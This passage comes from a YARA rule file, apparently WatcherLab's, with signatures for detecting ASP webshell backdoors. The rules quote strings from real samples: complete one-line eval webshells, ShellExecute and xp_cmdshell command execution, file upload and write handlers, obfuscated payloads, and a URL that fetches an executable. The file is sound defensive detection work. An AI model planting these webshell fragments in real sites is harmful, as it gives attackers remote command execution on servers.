        $s9 = "If InStr(LCase(oFile.Path)&\"\\\",LCase(Server.MapPath(\"/\")))>0 And Not IsScriptFile(oFso.GetExtensionName(oFile.Name)) Then" fullword ascii
        $s10 = "</td><td><input type=\"file\" name=\"upload\" size=\"35\" onchange=\"getSaveName();\"></td></tr>" fullword ascii
        $s11 = "Response.Write \"<script language=\"\"Javascript\"\">alert(\"\"\"&msg&\"\"\");window.close();</script>\"" fullword ascii
        $s12 = "Response.Write \"<script language=\"\"Javascript\"\">alert(\"\"\"&msg&\"\"\");history.back();</script>\"" fullword ascii
        $s13 = "<form name=\"pform\" method=\"post\" action=\"?page=fso&act=saveprop&fname=<% =Server.UrlEncode(Fname) %>\">" fullword ascii
        $s14 = "<form name=\"eform\" method=\"post\" action=\"?page=fso&act=saveedit&fname=<% =Server.UrlEncode(Fname) %>\">" fullword ascii
        $s15 = "<meta HTTP-EQUIV=\"Content-Type\" content=\"text/html; charset=GB2312\">" fullword ascii
        $s16 = "</td><td><input type=\"text\" size=\"40\" name=\"dbpath\" value=\"<% =Server.MapPath(\"/rs_pack.mdb\") %>\"></td></tr>" fullword ascii
        $s17 = "Response.Write \"<td>\"&getDriveType(oDrive.DriveType)&\"</td>\"" fullword ascii
        $s18 = "<!-- <tr><td><hr width=\"99%\" align=\"center\"></td></tr><tr> -->" fullword ascii
        $s19 = "<body bgcolor=\"#EEEEEE\" onload=\"document.uform.password.focus();\">" fullword ascii
        $s20 = "Response.Write \"<option value=\"\"\"&oDrive.DriveLetter&\":\\\"\">\"&oDrive.DriveLetter&\":\\</option>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule c22a13b1d42d48b40ffda63257c2ca2a0739f713
{
     meta:
        description = "asp - file c22a13b1d42d48b40ffda63257c2ca2a0739f713.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e6d4c45990af14e27b746c34ad0cc2b724b2bbe67ad6666c8ec6cc03cc5bd858"
     strings:
        $s1 = "a=Request.TotalBytes:if a Then b=\"adodb.stream\":Set c=Createobject (b):c.Type=1:c.Open:c.Write Request.BinaryRead (a):c.Positi" ascii
        $s2 = "rm-data  method=post><input type=file name=n><input type=submit></form>" fullword ascii
        $s3 = "<%Set objfSo = Server.CreateObject(\"Scripting.fileSystemObject\")%>" fullword ascii
        $s4 = "<%if request.QueryString(\"action\")=\"log\" then" fullword ascii
        $s5 = "<textarea name=cyfddata cols=39 rows=10 width=80 style=\"border:solid 1px\"></textarea>" fullword ascii
        $s6 = "<%Set objCountFile=objFSO.CreateTextFile(request(\"syfdpath\"),True)%>" fullword ascii
        $s7 = "<form action='' method=pOsT>" fullword ascii
        $s8 = "<br><input type=submit value=Save style=\"border:solid 1px\">" fullword ascii
        $s9 = "h,g-f- 3:h.Position=0:h.type=2:h.CharSet=\"BIG5\":i=h.Readtext:h.close:j=mid (i,InstrRev(i,\"\\\")+1,g):k=Instrb(d,e&e)+4:l=Inst" ascii
     condition:
        ( uint16(0) == 0x3fff and filesize < 6KB and ( all of them ) ) or ( all of them )
}

rule sig_24934ab54fe9741096d218b306347ed49e39b613
{
     meta:
        description = "asp - file 24934ab54fe9741096d218b306347ed49e39b613.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a2c27bba48ac3d292a060b3d1e428e504281826e333729e95d0b04f2056fa1c5"
     strings:
        $s1 = "const dbx=\"http://aspmuma.net/web/php.txt,http://aspmuma.net/web/aspx.txt,http://aspmuma.net/web/pl.txt\"" fullword ascii
        $s2 = "-c2yxo;W:KXtVx7;W:VcwVZy{CwZy>'44E/oYco'=cfCo c2Co4<>c2oXo/< `&E7r&` - `&bLK&`>c2oXo<`=KSy" fullword ascii
        $s3 = "`>ofXVE4/<}};VxocTo=octVxo.)'2ZN'(VrC;)(oX7yP4.)'2ZN'(VrC;)ESE(7Sd=cP2xS.yKb.)'2ZN'(VrC;)5XC(7Sd=cP2xS.rcZ.)'2ZN'(VrC{c42c};)(o" fullword ascii
        $s4 = ")`Z1`,`KZooPy`,`)'CCTE'(bLb;cP2xS.YyEN=cP2xS.yKb;'y4'=cP2xS.45:^KZooZy`(XVd&`;f4yK&;f4yK&>xcVxoYco/<`&dZt&`>'YfOAz:TowXb'=c2Co4" fullword ascii
        $s5 = ")`Z1`,`KZooPy`,`)'CCTE'(bLb;cP2xS.N4NY=cP2xS.yKb;'NY'=cP2xS.45:^KZooZy`(XVd&`;f4yK&;f4yK&>xcVxoYco/<`&57x&`>'YfOAz:TowXb'=c2Co4" fullword ascii
        $s6 = ")`>Kxf4/<`&)cP2xS.)`o2Pxdcg`(4cXoVcfZV8.)c7xR.NZx(4K7P2Zn.)L4P(4c2yxi.oxE(b5x &`>``` & )cP2xS.)`o2Pxdcg`(4cXoVcfZV8.)c7xR.NZx(4" fullword ascii
        $s7 = ")`>Kxf4/<`&))`KZXofXVE4cg`(4cXoVcfZV8.)c7xR.NZx(4K7P2Zn.)L4P(4c2yxi.oxE(b5x&`>``` & ))`KZXofXVE4cg`(4cXoVcfZV8.)c7xR.NZx(4K7P2Z" fullword ascii
        $s8 = "`;)')`&)Oq(VTE&`f7o.EKr 2cw&&f7o.zDeu 2cw E/ cYc.w7E`&)Oq(VTE&`(22cT4 oEc2c4','`& Toxf & `=c4xyxoxw;','W.O.ywc2Z.ocr.odZ4ZVEX7'" fullword ascii
        $s9 = "`;``}wVZh44xf${``=wVZb44x8 c4xyxoxg:Ugplm ocF;}waVc4P${=wa Vc4B;}cEVPZjyw${=cEVPZj xoxg ;W.O.Ugplm.ocF.odZ4ZVEXH=VcwXSZV8`=wdb" fullword ascii
        $s10 = ")`;)422PKfccL( ToXb 'f7o.EKr' 7ZVd ]EKr[ oVc4KX L2Py;)')`&)Oq(VTE&`f7o.EKr f7o.zDeu CfZE E/ cYc.w7E`&)Oq(VTE&`(22cT4 oEc2c4','`" fullword ascii
        $s11 = ")`;)')`&)Oq(VTE&`f7o.zDeu > `&bLL&` E/ cYc.w7E`&)Oq(VTE&`(22cT4 oEc2c4','`& Toxf & `=c4xyxoxw;','W.O.ywc2Z.ocr.odZ4ZVEX7'(oc`&7" fullword ascii
        $s12 = ";''=octVxo.7Vd;)(oX7yP4.7Vd;)(5Y7;'LKx2y_'=octVxo.7Vd;Vo4+'!'+K7P2ZE=cP2xS.7xVxf.7Vd;'2cw'=cP2xS.Txw.7Vd;)(oc4cV.7Vd;KVPocV))'?" fullword ascii
        $s13 = "& Toxf & `=c4xyxoxw;','W.O.ywc2Z.ocr.odZ4ZVEX7'(oc`&7bZ&`jbZVKcfZ 7ZVd * oEc2c4`(coPEcYc.ytr" fullword ascii
        $s14 = "`,`KZooPy`,`)'CCTE'(bLb;cP2xS.2dTE=cP2xS.yKb;'2d'=cP2xS.45:^KZooZy`(XVd&`;f4yK&;f4yK&`&)cYP,`zze|oYco`,`cYP`(XVd,``5rP" fullword ascii
        $s15 = "`,`KZooPy`,`)'CCTE'(bLb;'YN'=cP2xS.45;'`&))Y&`.o4co`(Tox8fxH.VcSVcj&`|`&)X(LwL(YC2&`'=cP2xS.yKb:^KZooZy`(XVd,`E`5rP" fullword ascii
        $s16 = "K7P2Zn.)L4P(4c2yxi.oxE(b5x & ```=c2oXo ';Yfk:odc2-tKXwwxf;YfWO:TowXb'=c2Co4 KxfjYXd=44x2E Kxf4<`,`E`(rK7&5bP=5bP" fullword ascii
        $s17 = ")`)ctx7a oKcoKZnKXy,VxTnVx3 Tox8KXy,gpGpijBln Ipv IGJHaG8 )D,W(IiaiRpga oKX wa(xoxgc2XQ c2yxi coxcVn`(coPEcYp.ytr" fullword ascii
        $s18 = "2rd=coxgCdawZH.))`\\`,bPX(2C5(c7xRc4Vx8.))c42xQ,`\\`,bPX(7tK(cExfjc7xR.wtr KcTo )2rd(coxg4a wKJ ``><2rd dX" fullword ascii
        $s19 = "n.)L4P(4c2yxi.oxE(b5x & ```=c2oXo ';Yfk:odc2-tKXwwxf;YfkM:TowXb'=c2Co4 KxfjYXd=44x2E Kxf4<`,``(rK7&5bP=5bP" fullword ascii
        $s20 = ")`'`&Y&`'=c7xK wKx 'Y'=cfCoY cVcTb 4oEcryZ4C4.Zyw.Vc`&fSL&`o4x7 7ZVd )*(oKPZE oEc2c4`(coPEcYp.ytr=4V ocj" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_78b5889b363043ed8a60bed939744b4b19503552
{
     meta:
        description = "asp - file 78b5889b363043ed8a60bed939744b4b19503552.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1f2199d3b299f97feec2616cbd173a4f2b0ef832bd2b8dc7981e2fad65c82d27"
     strings:
        $s1 = "xDmGVG.rJDP{~VbxVd]DT,ErNn0m;^Y^KVKDJrTp~VbxV/]DD,rJW(%+1YJrD /DX^+ 4C^0o.W!UN;WsGMP'~.T4+t" fullword ascii
        $s2 = "V@!#Palc{VOyXhGV.ypcO/K(Yb\"lY^/D)|@*\"4K3nVJ@!i*`OsT/+ -TDWW7I*`.$okY3c0TGy$+L/c3OWDtoc-oM0W7IbB" fullword ascii
        $s3 = "x_8@#@&Stk^n~`G?Dl.Y~Q,FT#,@!PG2U[@#@&P~9&2UN,x,qUUYMA`G?DCDD~Pfm~-8;DV6~[,\\4;.s0*_2@#@&P~PyRPXanP{Pq~=PK+ tW[+,x2Pl,KyRra+" fullword ascii
        $s4 = "=@*WLW.tTz@!Y[5V3OyX4NT}@*vDN;!VDyat9L\\-O9;V3Y.64[o\\-ON$MVO.6t9L}'/o0\"Wo\\-.Yi/LV.0L}.WY03at'K?Bi}jwKjoGBxD6k;m,0TGy4o@!=,w" fullword ascii
        $s5 = "YK2RmNNMWGDsRwWsNn.hlOtc-l^En~{PsGs9+.iDGaRC9NM0WM:cdE(:rYv#IN6Ex1OkKxPw;sVwWM:csHCs+Ssz^YbWUbPYW2 4k[+6GM: w1m:+c\\msE" fullword ascii
        $s6 = "SItEuRl=\"http://www.71hacker.com\" '" fullword ascii
        $s7 = "htp=\"http://www.i0day.com/\"  '" fullword ascii
        $s8 = "bg =\"http://www.i0day.com/xm.jpg\"  '" fullword ascii
        $s9 = "durl=\"http://www.i0day.com/pr.exe\"  '" fullword ascii
        $s10 = "0'E%l7l/1.rwD)wEsVoGM:cJrE[\"+KCDt`KCDt'J'ELs gls+#LJrE~rJ\\W7+oG^N+MEJ*BPKU^Vbm0'vDnO!DUPHn/K3cbEPmsCk/xBmhEPObY^+'E" fullword ascii
        $s11 = "jOD@#@&1WUx 3X+^EDn`rZ.nmY+~Pm4s+,obVnGlDl`&N,rxDP(fA1P(:5`ZSF*Pn\"(\\b\"5,|35~/djjKA]2G~~O4+nCO4P#lM/4l.BP6kV" fullword ascii
        $s12 = "NPU;4@#@&n!8sk1PUE8P/sm/d{wGV9+.cwWNn.glh+*@#@&?nDPM/P{P;.+mYnr(Ln^D`Z}H?:{sU6b@#@&fb:~kOns~~Y4nsKV[nM~PdzksrV" fullword ascii
        $s13 = "[Pb0@#@&%E@!JKG@*@!zP]@*@!&Kz$SA@*E@#@&2x[~UE8@#@&o!x^DkKxP\"+9c/DDb@#@&In[,'Pr@!s}1K,^GVKD{aW0++y @*J,'PkY.~LPJ@!&wrHK@*E@#@&3" fullword ascii
        $s14 = "@#@&,PPFcnGdbYkKUP{PfUOCDD@#@&P~Kq ;W2X:GP: S9&2x[RG?OlMO@#@&~,KyRnK/bOkKx~',!~l,K cPXa+P{~+P=P:  Z4CM/nY,xJT4+f8 J@#@&,PPq" fullword ascii
        $s15 = "xB,k9xB6B~\\mV;n{BJLW[rBPkr\"+{Bl!v@*E@#@&LE@!bUw!Y~Um:+xvUjCmDrKxv,YHw+{B4rN9+UB,k[xE?jm^YbWxE~-l^E" fullword ascii
        $s16 = "/ORUnM\\nM.mDkm4^n/vJ4YDwm4K/Yrb@#@&s1mhn'\"+$En/OcrsHlsnJ*@#@&^96'E@!DD@*@!D[,k[{N,hk9Y4x,lPGxtW;d" fullword ascii
        $s17 = "\\+ksk^nxJ,[,\\8m.s6P'PrRfb/C8^+'TE,[~\\(^MVW,[,JO\"+^KlDtd'8J~',\\41.V6P[,m@#@&rOg+nNjn1E.+{TJ,[~-(mDsW,[~J ubNn_k9N+" fullword ascii
        $s18 = "J~P4+x,@#@&,PP,~~?w1{sGV[nM[E-r'/DDo[gl:n@#@&P~P,~,ZC^V,M+Db^ssbVn`UsHb@#@&PAUN,q0@#@&~Pg+XY@#@&~~9khPkODwVHCs+@#@&~,sGD,3mm4,r" fullword ascii
        $s19 = ",EJrPGx\\G!/nr!O'rJO4b/RdOHVnR(C13LMW!xN;W^GD{B:FyF+qyBJr@*@!mPtMnW'ELm\\C/^.bwO)U4WSsGs9+DcErJ'I" fullword ascii
        $s20 = "@*|#F|={O6k;^~#=;^^1=|'D[$0~#=6YDMWb|={Y4x.P\"a40W@!@*ybEW0xWEK/$Pv441O)\"k!GYbOOWK/BxOkx\"V,4Tyx6EK/;1PM\"@!@*3\"@!#[/i{Zj" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule cd14346f158a616ca9a79edf07e3eb3acc84afae
{
     meta:
        description = "asp - file cd14346f158a616ca9a79edf07e3eb3acc84afae.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ce13b9dcf134bea0a6766c65f8229455bbe3fabae225018fcf252f091aefb019"
     strings:
        $x1 = "\");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = \"Provider=" ascii
        $x2 = "\",FName);top.hideform.FName.value = DName;}else{DName = \"Other\";}if(DName!=null){top.hideform.Action.value = FAction;top.hide" ascii
        $x3 = "seshell.ShellExecute shellpath,\" /c \" & defcmd & \" > \" & sztempfile,\"\",\"open\",0" fullword ascii
        $x4 = "\");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = \"Provider=" ascii
        $x5 = "CONn.EXEcutE(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)\")" fullword ascii
        $x6 = "></form></tr></table>\":jb SI:SI=\"\":If trim(request.form(\"MMD\"))<>\"\"  Then:password= trim(Request.form(\"P\")):id=trim(Req" ascii
        $x7 = "jb\"<title>\"&nimajb&\" - \"&nimajbm&\" </title>\":jb\"<style type=\"\"text/css\"\">\":jb\"body,td{font-size: 12px;background-co" ascii
        $x8 = "ConnstR=\"Provider=SQLOLEDB.1;Data Source=\" & tARgETIp &\",\"& PoRtNUm &\";User ID=lake2;Password=;\"" fullword ascii
        $s9 = "crosoft.Jet.OLEDB.4.0;Data Source=D:\\\\VirtualHost\\\\343266.ctc-w217.dns.com.cn\\\\www\\\\db.mdb;Jet OLEDB:Database Password=*" ascii
        $s10 = "osoft.Jet.OLEDB.4.0;Data Source=D:\\\\VirtualHost\\\\343266.ctc-w217.dns.com.cn\\\\www\\\\db.mdb;Jet OLEDB:Database Password=***" ascii
        $s11 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'>\"" fullword ascii
        $s12 = "!)</font></a></center>\":jb\"<tr><td height='20'><a href='?Action=Upload' target='FileFrame'><center><font color=red size=5px>(" fullword ascii
        $s13 = "jb\"<input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))>\"" fullword ascii
        $s14 = "jb\"<tr><td height='20'><a href='?Action=Cmd1Shell' target='FileFrame'>" fullword ascii
        $s15 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/M_Schumacher/upadmin/s2\", True, \"\", \"\"" fullword ascii
        $s16 = "\"exec master.dbo.xp_cMdsHeLl '\" & request.form(\"MMD\") & \"'\":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF" ascii
        $s17 = "xpost3.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s18 = "xpost.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s19 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s1\",True, \"\", \"\"" fullword ascii
        $s20 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s3\", True, \"\", \"\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_42ca332dbe4463b083d24bd019115a00db413c2b
{
     meta:
        description = "asp - file 42ca332dbe4463b083d24bd019115a00db413c2b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bc041032ed36879be7e068d17db8fdbe4c251596276fba1cc4f8ac8efa2bae34"
     strings:
        $x1 = "seshell.ShellExecute shellpath,\" /c \" & defcmd & \" > \" & sztempfile,\"\",\"open\",0" fullword ascii
        $x2 = "CONn.EXEcutE(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)\")" fullword ascii
        $x3 = "'jb\"<tr><td height='22'><a href='http://tiquan.net/pr/?Submit=+%B2%E9+%D1%AF+&domain=\"&Worinima&\"' target='FileFrame'>" fullword ascii
        $x4 = "></form></tr></table>\":jb SI:SI=\"\":If trim(request.form(\"MMD\"))<>\"\"  Then:password= trim(Request.form(\"P\")):id=trim(Req" ascii
        $x5 = "jb\"<title>\"&nimajb&\" - \"&nimajbm&\" </title>\":jb\"<style type=\"\"text/css\"\">\":jb\"body,td{font-size: 12px;background-co" ascii
        $x6 = "ConnstR=\"Provider=SQLOLEDB.1;Data Source=\" & tARgETIp &\",\"& PoRtNUm &\";User ID=lake2;Password=;\"" fullword ascii
        $s7 = "'jb\"<tr><td height='22'><a href='http://tiquan.net/ip/?action=sed&cx_33=\"&ServerU&\"' target='FileFrame'>" fullword ascii
        $s8 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'>\"" fullword ascii
        $s9 = "!)</font></a></center>\":jb\"<tr><td height='20'><a href='?Action=Upload' target='FileFrame'><center><font color=red size=5px>(" fullword ascii
        $s10 = "jb\"<input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))>\"" fullword ascii
        $s11 = "jb\"<tr><td height='20'><a href='?Action=Cmd1Shell' target='FileFrame'>" fullword ascii
        $s12 = "'jb\"<tr><td height='22'><a href='http://tiquan.net/mmgx/index.htm' target='FileFrame'>" fullword ascii
        $s13 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/M_Schumacher/upadmin/s2\", True, \"\", \"\"" fullword ascii
        $s14 = "\"exec master.dbo.xp_cMdsHeLl '\" & request.form(\"MMD\") & \"'\":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF" ascii
        $s15 = "xpost3.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s16 = "xpost.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s17 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s1\",True, \"\", \"\"" fullword ascii
        $s18 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s3\", True, \"\", \"\"" fullword ascii
        $s19 = "jb\"<tr><td height='20'><a href='?Action=hiddenshell' target='FileFrame'>" fullword ascii
        $s20 = "CONN.ExecUtE(sqlSTR)" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule d318224082d67e3fe1dcfe4ad765ec9bc442d6ab
{
     meta:
        description = "asp - file d318224082d67e3fe1dcfe4ad765ec9bc442d6ab.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "810348fc36bd4eb7afad0b21b6c94ae6e268f762bdac933af4288f6a71a59636"
     strings:
        $s1 = "temp = Mid(mumaasp, i, 1) temp" fullword ascii
        $s2 = "UnEncode=temp" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_4228c219b170fcc6cb1ff066d711b433798dfc69
{
     meta:
        description = "asp - file 4228c219b170fcc6cb1ff066d711b433798dfc69.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "921ddd1e7f11ee6a48b055c12d8c11b332556d77e41a6ee0897a2cf1a2db093a"
     strings:
        $s1 = "<%eval(\"e\"&\"v\"&\"a\"&\"l\"&\"(\"&\"r\"&\"e\"&\"q\"&\"u\"&\"e\"&\"s\"&\"t\"&\"(\"&\"0" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_60620630931b200f7816afbb3dcccedfe871c1f6
{
     meta:
        description = "asp - file 60620630931b200f7816afbb3dcccedfe871c1f6.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "22a5131578406b2a6e6da408b8467d6a9638fbaea3b0b2e7a9e3e94b129ef708"
     strings:
        $s1 = "If Sql_serverip<>\"\" and Sql_linkport<>\"\" and Sql_username<>\"\" and Sql_password<>\"\" and Sql_content<>\"\" Then" fullword ascii
        $s2 = "<form method=\"post\" action=\"<%=Request.ServerVariables(\"SCRIPT_NAME\")%>?do=exec\" target=\"ResultFrame\">" fullword ascii
        $s3 = "Dim Sql_serverip,Sql_linkport,Sql_username,Sql_password,Sql_database,Sql_content" fullword ascii
        $s4 = "<tr><td width=\"80\">PASSWORD:</td><td><input type=\"password\" name=\"Sql_password\"  style=\"width:150px;\"></td></tr>" fullword ascii
        $s5 = "conn.execute SQL" fullword ascii
        $s6 = "<textarea name=\"Sql_content\" style='width:100%;height:100%;'>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_" ascii
        $s7 = "<meta http-equiv=\"expires\" content=\"Wed, 26 Feb 2006 00:00:00 GMT\">" fullword ascii
        $s8 = "<textarea name=\"Sql_content\" style='width:100%;height:100%;'>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_" ascii
        $s9 = "linkStr=\"driver={SQL Server};Server=\" & Sql_serverip & \",\" & Sql_linkport & \";uid=\" & Sql_username & \";pwd=\" & Sql_passw" ascii
        $s10 = "linkStr=\"driver={SQL Server};Server=\" & Sql_serverip & \",\" & Sql_linkport & \";uid=\" & Sql_username & \";pwd=\" & Sql_passw" ascii
        $s11 = "linkStr=\"driver={SQL Server};Server=\" & Sql_serverip & \",\" & Sql_linkport & \";uid=\" & Sql_username & \";pwd=\" & Sql_passw" ascii
        $s12 = "<tr><td width=\"80\">USERNAME:</td><td><input type=\"text\"     name=\"Sql_username\"  style=\"width:150px;\"></td></tr>" fullword ascii
        $s13 = "<tr><td width=\"80\">LINKPORT:</td><td><input type=\"text\"     name=\"Sql_linkport\"  style=\"width:150px;\"></td></tr>" fullword ascii
        $s14 = "nfigure 'xp_cmdshell', 1;RECONFIGURE</textarea>" fullword ascii
        $s15 = "Sql_password=Trim(Request(\"Sql_password\"))" fullword ascii
        $s16 = "<meta http-equiv=\"Cache-Control\" content=\"no-cache, must-revalidate\">" fullword ascii
        $s17 = "<iframe name=\"ResultFrame\" width=\"100%\" height=\"200\" src=\"<%=Request.ServerVariables(\"SCRIPT_NAME\")%>?do=exec\"></ifram" ascii
        $s18 = "<tr><td width=\"80\">DATABASE:</td><td><input type=\"text\"     name=\"Sql_database\"  style=\"width:150px;\"></td></tr>" fullword ascii
        $s19 = "<tr><td width=\"80\">SERVERIP:</td><td><input type=\"text\"     name=\"Sql_serverip\"  style=\"width:150px;\"></td></tr>" fullword ascii
        $s20 = "<meta http-equiv=\"pragma\" content=\"no-cache\">" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule sig_658f33a1ad5b3db81f67f742b9236a4525be5e48
{
     meta:
        description = "asp - file 658f33a1ad5b3db81f67f742b9236a4525be5e48.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "701f7523ad1d7b2146efc8b23bf1a31c28c617b8e1b8eb5fc4ffa95007b2ad91"
     strings:
        $s1 = "<%executeGlobal(StrReverse(Request(Chr(98))))%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_9b716d5567289aae1881a416fff247eb53cce718
{
     meta:
        description = "asp - file 9b716d5567289aae1881a416fff247eb53cce718.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8009a7f38189b6bdc8e8afca6fc2aa27ab1ca09525e36e3664de8436b78cf439"
     strings:
        $s1 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail.com title=\"E-mail G" fullword ascii
        $s2 = "r: #003333; scrollbar-darkshadow-color: #000000; scrollbar-track-color: #993300; scrollbar-arrow-color: #CC3300;}" fullword ascii
        $s3 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: 4px; LETTER-SPACING: 1px; HEIGHT: 27px" fullword ascii
        $s4 = "ls+UQMAAA==^#~@%> - www.infilak.tr.cx</title><%#@~^HAEAAA==@#@&l^DP{PI" fullword ascii
        $s5 = "D /M+lDnr(L+1OcJtk1DG/GWDRpHduK:nEb@#@&W8%_KPnc6a+U,JV2Kr~,EJL3slkW.'rJ~,Wl^/+@#@&G4NC:KKRjn" fullword ascii
        $s6 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
        $s7 = "nder\"><font face=wingdings color=lime size=4>*</font> </a>&nbsp; <a href=http://www.infilaktim.tk title=\"I.N.F Sitesi\" target" ascii
        $s8 = "dDRWKDs`Jb/^n:r#@#@&b0~rkV+sxJrPY4nU@#@&kkVn:~x,J[EME@#@&+U[,k0@#@&b0~3^CkW.,',JJ,Y4nx,3slkW.x,D+$;+kYRkn.\\" fullword ascii
        $s9 = "nder\"><font face=wingdings color=lime size=4>*</font> </a>&nbsp; <a href=http://www.infilaktim.tk title=\"I.N.F Sitesi\" target" ascii
        $s10 = "@!zm@*Pr9LwCAA==^#~@%><title>I.N.F HACKING CENTER - <%=#@~^CAAAAA==2MWm" fullword ascii
        $s11 = "=klasor size=49 value=\"<%=#@~^BgAAAA==V^ldKDjAIAAA==^#~@%>\"> &nbsp; <input type=submit value=\"Kodlar" fullword ascii
        $s12 = "%\" border=0 bgcolor=\"#666666\" cellpadding=1 cellspacing=1><tr><td><center> <%#@~^WQAAAA==@#@&DnkwKx/" fullword ascii
        $s13 = "lank><font face=wingdings color=lime size=4>M</font> </a>&nbsp; <a href=\"?action=help\" title=\"Yard" fullword ascii
        $s14 = "8dwp@!(D@*@!8.@*@!CP4.+6'hCbVYGlslrV(Gs4@$4WD:lbVc^Ws@*\\+4Nr@!Jl@*LU4kwiLU8/aiLx8/2ILx8/aI[" fullword ascii
        $s15 = "P+XY#@#@&.+kwKxd+ AMkO+,VW9VC.@#@&+U[,kWoT4AAA==^#~@%>" fullword ascii
        $s16 = "D7l.kC8^+d`r)nhSmK_5?(/zSmnzP_Jb@#@&gVMAAA==^#~@%><center> <%#@~^UAAAAA==@#@&DnkwKx/" fullword ascii
        $s17 = "FONT-SIZE: 11px; BACKGROUND: none transparent scroll repeat 0% 0%; COLOR: #006699; FONT-FAMILY: Verdana, Helvetica" fullword ascii
        $s18 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 toolbar=no scrollbars=yes' )\"><font face=wingdi" ascii
        $s19 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 toolbar=no scrollbars=yes' )\"><font face=wingdi" ascii
        $s20 = "<tr><td bgcolor=\"#CCCCCC\" height=359><%#@~^QwAAAA==r6PUKY,k/^+s~',J8lkVCE,Yt" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule sig_6b495908dc45bfc4f8d9c87c7d856ab42314928b
{
     meta:
        description = "asp - file 6b495908dc45bfc4f8d9c87c7d856ab42314928b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3d2a06dbb34ad0789eb3e30447c60f8276ced0969f5b458c5700edae4e3777fe"
     strings:
        $s1 = "<img src=\"http://i141.photobucket.com/albums/r61/22rockets/HeartBeat.gif\">" fullword ascii
        $s2 = "<%=\"<input name='pass' type='password' size='10'> <input \"%><%=\"type='submit' value='" fullword ascii
        $s3 = "- F4ckTeam<a href=\"http://team.f4ck.net\"><font color=\"#CCCCCC\">" fullword ascii
        $s4 = "<%=\"<center><br><form action='' method='post'>\"%>" fullword ascii
        $s5 = ":\"&server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
        $s6 = "if request(\"pass\")=\"F4ck\" then  '" fullword ascii
        $s7 = "<%if session(\"pw\")<>\"go\" then %>" fullword ascii
        $s8 = "<%=\"<textarea name=da cols=50 rows=10 width=30></textarea>\"%>" fullword ascii
     condition:
        ( uint16(0) == 0x683c and filesize < 5KB and ( all of them ) ) or ( all of them )
}

